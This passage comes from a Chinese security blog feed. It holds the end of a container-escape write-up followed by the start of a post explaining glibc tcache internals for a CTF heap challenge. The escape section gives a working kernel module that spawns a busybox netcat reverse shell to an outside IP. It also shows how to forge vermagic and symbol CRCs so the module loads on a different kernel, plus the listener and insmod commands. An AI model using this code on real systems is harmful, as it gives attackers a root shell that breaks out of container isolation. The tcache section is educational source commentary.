class="title">escape_start</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> *envp[] = &#123;</span><br><span class="line">        <span class="string">&quot;SHELL=/bin/bash&quot;</span>,</span><br><span class="line">        <span class="string">&quot;HOME=/home/cyberark&quot;</span>,</span><br><span class="line">        <span class="string">&quot;USER=cyberark&quot;</span>,</span><br><span class="line">        <span class="string">&quot;PATH=/home/cyberark/bin:/home/cyberark/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/home/cyberark&quot;</span>,</span><br><span class="line">        <span class="string">&quot;DISPLAY=:0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;PWD=/home/cyberark&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *argv[] = &#123;<span class="string">&quot;/bin/busybox&quot;</span>, <span class="string">&quot;nc&quot;</span>, <span class="string">&quot;54.87.128.209&quot;</span>, <span class="string">&quot;4444&quot;</span>, <span class="string">&quot;-e&quot;</span>, <span class="string">&quot;/bin/bash&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">    rc = call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_PROC);</span><br><span class="line">    printk(<span class="string">&quot;RC is: %i \n&quot;</span>, rc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">escape_end</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_EMERG <span class="string">&quot;Goodbye!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(escape_start);</span><br><span class="line">module_exit(escape_end);</span><br></pre></td></tr></table></figure>

<p>该模块调用busybox中的netcat，该busybox已经通过我们的命令安装在主机的文件系统上。<br>接下来，为nsescape代码创建一个Makefile并对其进行编译：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">obj-m = nsescape.o</span><br><span class="line"><span class="section">all:</span></span><br><span class="line">make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build/ M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure>

<p>执行make：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ make</span><br><span class="line">make -C /lib/modules/4.17.0-rc2/build/ M=/root/cprojects/kernelmod/nsescape modules</span><br><span class="line">make[1]: Entering directory <span class="string">&#x27;/root/debian/linux-4.17-rc2&#x27;</span></span><br><span class="line">Building modules, stage 2.</span><br><span class="line">MODPOST 1 modules</span><br><span class="line"><span class="built_in">read</span> <span class="built_in">continue</span></span><br></pre></td></tr></table></figure>

<p>暂停make过程后，就像对探测模块所做的那样，编辑文件nsescape.mod.c以更改vermagic和CRC：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/vermagic.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/compiler.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_INFO(vermagic, <span class="string">&quot;4.4.0-96-generic SMP mod_unload modversions &quot;</span>);</span><br><span class="line">MODULE_INFO(name, KBUILD_MODNAME);</span><br><span class="line"></span><br><span class="line">__visible <span class="class"><span class="keyword">struct</span> <span class="title">module</span> __<span class="title">this_module</span></span></span><br><span class="line"><span class="class">__<span class="title">attribute__</span>((<span class="title">section</span>(&quot;.<span class="title">gnu</span>.<span class="title">linkonce</span>.<span class="title">this_module</span>&quot;))) = &#123;</span></span><br><span class="line">.name = KBUILD_MODNAME,</span><br><span class="line">.init = init_module,</span><br><span class="line">#ifdef CONFIG_MODULE_UNLOAD</span><br><span class="line">.<span class="built_in">exit</span> = cleanup_module,</span><br><span class="line">#endif</span><br><span class="line">.arch = MODULE_ARCH_INIT,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RETPOLINE</span></span><br><span class="line">MODULE_INFO(retpoline, <span class="string">&quot;Y&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">modversion_info</span> ____<span class="title">versions</span>[]</span></span><br><span class="line"><span class="class">__<span class="title">used</span></span></span><br><span class="line"><span class="class">__<span class="title">attribute__</span>((<span class="title">section</span>(&quot;__<span class="title">versions</span>&quot;))) = &#123;</span></span><br><span class="line">&#123; <span class="comment">/*0x6cb06770*/</span> <span class="number">0xfc5ded98</span>, __VMLINUX_SYMBOL_STR(module_layout) &#125;,</span><br><span class="line">&#123; <span class="number">0xdb7305a1</span>, __VMLINUX_SYMBOL_STR(__stack_chk_fail) &#125;,</span><br><span class="line">&#123; <span class="number">0x27e1a049</span>, __VMLINUX_SYMBOL_STR(printk) &#125;,</span><br><span class="line">&#123; <span class="comment">/*0xa7eedcc4*/</span> <span class="number">0xc5fdef94</span>, __VMLINUX_SYMBOL_STR(call_usermodehelper) &#125;,</span><br><span class="line">&#123; <span class="number">0xbdfb6dbb</span>, __VMLINUX_SYMBOL_STR(__fentry__) &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> __module_depends[]</span><br><span class="line">__used</span><br><span class="line">__attribute__((section(<span class="string">&quot;.modinfo&quot;</span>))) =</span><br><span class="line"><span class="string">&quot;depends=&quot;</span>;</span><br><span class="line"></span><br><span class="line">MODULE_INFO(srcversion, <span class="string">&quot;E4B73EA24DFD56CAEDF8C67&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>更改vermagic以匹配目标内核，并更改module_layout和call_usermodhelper的CRC以匹配我们从探测模块获得的数字。其他CRC（printk，__ fentry__和__stack_chk_fail）在两个内核之间没有改变。最后，就像使用探测模块一样，使用chngelf实用程序将输出文件中的init_module可重定位偏移量从0x178更改为0x180。<br>最本地运行监听程序：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc –l 4444 -vvv</span><br></pre></td></tr></table></figure>

<p>远程主机：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[node1] $ insmod nsescape.ko</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>linux</tag>
        <tag>kernel</tag>
        <tag>docker</tag>
        <tag>escape</tag>
        <tag>2020</tag>
      </tags>
  </entry>
  <entry>
    <title>Play With Tcache &amp; LCTF 2018 easy_heap</title>
    <url>/2018/11/22/play-with-tcache/</url>
    <content><![CDATA[<h2 id="tcache简介"><a href="#tcache简介" class="headerlink" title="tcache简介"></a>tcache简介</h2><p>tcache是在libc 2.27中加入的chunk快速缓存机制。在<code>malloc.c</code>中有如下定义：</p>
<ul>
<li>共有64个tcache bin。</li>
<li>使用<code>tidx2usize(idx)</code>对tcache的chunk进行大小计算。</li>
<li>每个tcache bin最多存有<code>TCACHE_FILL_COUNT</code>个chunk（默认为7）。</li>
</ul>
<a id="more"></a>

<p>从代码中也可以看出，tcache是线程独立的，每一个线程拥有自己的<code>tcache_perthread_struct</code>结构体，该结构体记录每一个bin的入口和每一个bin中被放入的chunk的数量。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS		64</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAX_TCACHE_SIZE	tidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> tidx2usize(idx)	(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>

<h2 id="tcache的操作"><a href="#tcache的操作" class="headerlink" title="tcache的操作"></a>tcache的操作</h2><p>libc中存取tcache中的chunk主要通过<code>tcache_put</code>和<code>tcache_get</code>两个函数实现。在<code>malloc()</code>和<code>free()</code>的本体和马甲中，均有<code>tcache_put</code>和<code>tcache_get</code>的调用。</p>
<h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put()"></a>tcache_put()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// malloc.c:2923</span></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 获取chunk用于保存内容的地址，进行强制类型转换</span></span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  <span class="comment">// 对于idx的安全检查</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  <span class="comment">// next指针指向对应bin中的第一个chunk</span></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="comment">// 插入对应bin中的第一个地址</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  <span class="comment">// 计数加1</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get()"></a>tcache_get()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 获取相应的bin</span></span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="comment">// 对于idx的安全检查</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  <span class="comment">// 检测bin是否为空</span></span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  <span class="comment">// 获得chunk</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  <span class="comment">// 计数减1</span></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc()"></a>__libc_malloc()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> checked_request2size(req, sz) \</span></span><br><span class="line">(&#123;				    \</span><br><span class="line">  (sz) = request2size (req);	    \</span><br><span class="line">  <span class="keyword">if</span> (((sz) &lt; (req))		    \</span><br><span class="line">      || REQUEST_OUT_OF_RANGE (sz)) \</span><br><span class="line">    &#123;				    \</span><br><span class="line">      __set_errno (ENOMEM);	    \</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;			    \</span><br><span class="line">    &#125;				    \</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>)) <span class="comment">// __malloc_hook check</span></span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  <span class="comment">// 转换为tbytes</span></span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes); <span class="comment">// 计算tcache index</span></span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// idx安全检查，且对应bin非空</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx); <span class="comment">// 调用tcache_get()</span></span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">	      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">// 否则调用_int_malloc</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free()"></a>__libc_free()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_free (<span class="keyword">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> (*hook) (<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>)) <span class="comment">// __free_hook check</span></span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);  <span class="comment">// 获取chunk的指针</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span></span><br><span class="line"><span class="comment">	 Dumped fake mmapped chunks do not affect the threshold.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX</span><br><span class="line">	  &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p))</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE (); <span class="comment">// 初始化tcache</span></span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>); <span class="comment">// real free</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc()"></a>_int_malloc()</h3><h4 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// malloc.c:3581</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123; <span class="comment">// 如果申请的chunk大小在fasbin的范围内</span></span><br><span class="line">      idx = fastbin_index (nb); <span class="comment">// 计算fastbin的idx</span></span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx); <span class="comment">// 获取对应的fastbin</span></span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb; <span class="comment">// 命中的chunk</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>) <span class="comment">// 如果对应的fastbin中有chunk</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">	    *fb = victim-&gt;fd; <span class="comment">// 取出bin第一个chunk</span></span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    REMOVE_FB (fb, pp, victim); <span class="comment">// 从多线程中移除一个fastbin chunk</span></span><br><span class="line">	  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>)) <span class="comment">// 如果命中fastbin chunk</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">	      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>)) <span class="comment">// idx安全检查</span></span><br><span class="line">		malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">	      check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">		 stash them in the tcache.  */</span></span><br><span class="line">	      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">          <span class="comment">// 将命中的大小的fastbin的剩余chunk放入tcache中（如果对应的tcache还没满）</span></span><br><span class="line">	      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">		&#123;</span><br><span class="line">		  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">		  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">		  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">			 &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">			*fb = tc_victim-&gt;fd;</span><br><span class="line">		      <span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">			  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">			  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">			    <span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		      tcache_put (tc_victim, tc_idx); <span class="comment">// 放入tcache</span></span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">	      alloc_perturb (p, bytes);</span><br><span class="line">	      <span class="keyword">return</span> p;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> first(b)     ((b)-&gt;fd)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))  <span class="comment">// 如果在smallbin的范围内</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb); <span class="comment">// 获取smallbin index</span></span><br><span class="line">      bin = bin_at (av, idx);    <span class="comment">// 获取smallbin</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin) <span class="comment">// 检查是否有chunk</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="comment">// 检查链表，victiom-&gt;bk-&gt;fd与victim</span></span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin; <span class="comment">// 取出victim</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">          <span class="comment">// 将命中的大小的smallbin的剩余chunk放入tcache中（如果对应的tcache还没满）</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb); <span class="comment">// 没有安全检查</span></span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin; <span class="comment">// 取出victim</span></span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx); <span class="comment">// 放入tcache</span></span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">     While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">     even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">     fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">     Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">     large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">     invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">     it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="comment">// 如果不在small bin的范围内</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

